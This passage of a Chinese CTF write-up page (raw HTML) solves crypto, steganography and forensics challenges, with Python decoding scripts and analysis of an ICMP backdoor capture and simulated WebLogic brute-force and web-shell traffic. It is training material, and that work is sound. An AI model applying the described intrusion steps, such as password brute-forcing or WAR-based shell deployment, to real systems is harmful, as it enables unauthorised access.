&nbsp;&nbsp;&nbsp;&nbsp;m=pow(c,d,n)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;n2s(m)</pre><h3 id="toc_23" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3.神秘的代码</h3><h4 id="toc_24" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">xor</p><h4 id="toc_25" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">xor+aes_ecb</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">本题出的有些脑洞，已暴打出题人...</p><h4 id="toc_26" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">将明文与密文进行异或，得到一段hint，如下所示：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i'm not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">这里将大写字母提取出来，是<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">THISTHEKEYIV</code>，后面又提示是aes_ecb，所以这里有一个坑点，这个大写字母的组合并不是aes算法的key，所以也不能用来解密，然后后面又提示是md5(this)，即将整段话进行md5，然后进行解密，最后的代码如下：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">import&nbsp;base64
import&nbsp;hashlib
from&nbsp;Crypto.Cipher&nbsp;import&nbsp;AES

def&nbsp;readfile(path):
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(path,&nbsp;'r')&nbsp;as&nbsp;f:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;f.read()
def&nbsp;xor(s1,&nbsp;s2):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;''.join(chr(ord(a)&nbsp;^&nbsp;ord(b))&nbsp;for&nbsp;a,b&nbsp;in&nbsp;zip(s1,s2))
#&nbsp;read&nbsp;the&nbsp;files
clear&nbsp;=&nbsp;readfile('info_clear.txt')
crypt&nbsp;=&nbsp;readfile('info_crypt.txt')
superhero&nbsp;=&nbsp;readfile('true_crypto.txt')
superhero&nbsp;=&nbsp;base64.b64decode(superhero)

#&nbsp;get&nbsp;the&nbsp;key
dec&nbsp;=&nbsp;xor(clear,crypt).rstrip('\n').encode('utf-8')
print(dec)
key&nbsp;=&nbsp;hashlib.md5(dec).hexdigest().encode()
print(key)

#&nbsp;decrypt&nbsp;aes-ecbcipher&nbsp;=&nbsp;AES.new(key,&nbsp;AES.MODE_ECB)
msg&nbsp;=&nbsp;cipher.decrypt(superhero)
print(msg)</pre><h2 id="toc_27" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Stego - 3</h2><h3 id="toc_28" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1.啊哒</h3><h4 id="toc_29" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">有趣的表情包</p><h4 id="toc_30" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">exif、隐藏压缩包</p><h4 id="toc_31" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">拿到之后是一个jpg文件，先使用binwalk分析下文件，得到图片中隐藏了一段tiff信息以及一个压缩包，都分离出来，发现压缩包被加密了，tiff信息在相机型号出处有一段十六进制，转换成字符串以后是sdnisc_2018,如下图所示：<span class="Apple-converted-space">&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411411142285.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415774544328413.png" title="image.png" alt="image.png" width="736" height="511" style="width: 736px; height: 511px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用这个密码解密压缩包，即可获得flag</p><h3 id="toc_32" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2.color</h3><h4 id="toc_33" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">你见过彩虹吗？</p><h4 id="toc_34" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">拉长图片，二进制转字符串。</p><h4 id="toc_35" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">查看每张图片的最低位，发现有变化。组成之后是一句话：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">Make Me Tall</code></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">根据提示意思应该是要调整png的尺寸，扩大高度。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">发现原来图像下部，有黑白块儿，按照<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">黑-&gt;1</code>，<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">白-&gt;0</code>转化成二进制数。</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">1111111101011110111111111011111110111111&nbsp;
00001100101010110001&nbsp;01001010010000001101&nbsp;11010011011101010111&nbsp;
1001101101101011011000111001101101111101</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">经过多次尝试之后发现，每一列，七个数字组成一个字符，进行二进制转化之后即可得到flag。</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">#coding:utf-8
def&nbsp;encode(s):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;'&nbsp;'.join([bin(ord(c)).replace('0b',&nbsp;'')&nbsp;for&nbsp;c&nbsp;in&nbsp;s])
def&nbsp;decode(s):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;''.join([chr(i)&nbsp;for&nbsp;i&nbsp;in&nbsp;[int(b,&nbsp;2)&nbsp;for&nbsp;b&nbsp;in&nbsp;s.split('&nbsp;')]])

l&nbsp;=&nbsp;['']&nbsp;*&nbsp;7

f&nbsp;=&nbsp;open('code.txt',&nbsp;'r')&nbsp;#&nbsp;01矩阵
for&nbsp;i&nbsp;in&nbsp;range(7):
&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;line&nbsp;=&nbsp;f.readline().replace('\n','')
&nbsp;&nbsp;&nbsp;&nbsp;l[i]&nbsp;=&nbsp;line
#&nbsp;print&nbsp;l

##&nbsp;矩阵初始化
ll=['']&nbsp;*&nbsp;20
for&nbsp;i&nbsp;in&nbsp;range(len(ll)):
&nbsp;&nbsp;&nbsp;&nbsp;ll[i]=['']&nbsp;*&nbsp;7
##&nbsp;矩阵翻转
for&nbsp;i&nbsp;in&nbsp;range(20):&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(7):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ll[i][j]&nbsp;=&nbsp;l[j][i]
#&nbsp;print&nbsp;&nbsp;ll

flag&nbsp;=&nbsp;''
for&nbsp;i&nbsp;in&nbsp;ll:
&nbsp;&nbsp;&nbsp;&nbsp;t&nbsp;=&nbsp;''.join(i)
&nbsp;&nbsp;&nbsp;&nbsp;flag&nbsp;+=&nbsp;decode(t)
&nbsp;&nbsp;&nbsp;&nbsp;
print&nbsp;flag</pre><h3 id="toc_36" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3.神秘的文件</h3><h4 id="toc_37" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><h4 id="toc_38" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">明文破解 + doc隐写</p><h4 id="toc_39" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">将题目解压出来，题目压缩包里有个logo.png和一个加密压缩包，很明显的明文破解，使用题目压缩包作为key和writeup压缩包进行明文破解(或者使用2345好压的标准压缩算法压缩logo.png)，得到密码：<span class="Apple-converted-space">&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411411517536.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415780256918714.png" title="image.png" alt="image.png" width="564" height="213" style="width: 564px; height: 213px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解压后得到doc文件，当成压缩包解密，能找到flag.txt中有一串base64编码的字符串，解码即可。</p><h2 id="toc_40" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Forensic - 5</h2><h3 id="toc_41" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1.特殊后门</h3><h4 id="toc_42" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">从通信方式的角度看，后门可分为http/https型、irc型、dns型、icmp型等等。安全人员抓到一份可疑的流量包，请从中分析出利用某种特殊协议传输的数据。</p><h4 id="toc_43" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">携带数据的ICMP包分析</p><h4 id="toc_44" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用科来分析工具进行全面分析，可以看到数据包数量不多，使用协议浏览器查看流量包：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415783152792936.png" title="image.png" alt="image.png" width="378" height="390" style="width: 378px; height: 390px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414306830764.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">逐个查看特殊协议，可以发现ICMP协议数据包中的数据：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414309810314.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415782234260709.png" title="image.png" alt="image.png" width="742" height="155" style="width: 742px; height: 155px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">依次查看ICMP包，拼接即可得到flag。</p><h4 id="toc_45" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">flag</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{Icmp_backdoor_can_transfer-some_infomation}</code></p><h3 id="toc_46" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2. weblogic</h3><h4 id="toc_47" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">黑客攻击了Weblogic应用，请分析攻击过程，找出Weblogic的主机名。flag格式：flag{}</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Tip：主机名为十六进制。</p><h4 id="toc_48" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">weblogic 攻击流量审计。模拟了爆破weblogic登录密码，通过部署war包getshell，执行命令获取hostname的操作。</p><h4 id="toc_49" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用科来分析工具打开流量包，在数据包选项中，Ctrl+F搜索字符串<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">hostname</code>，可以找到编号为658、662的数据包当中存在<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: 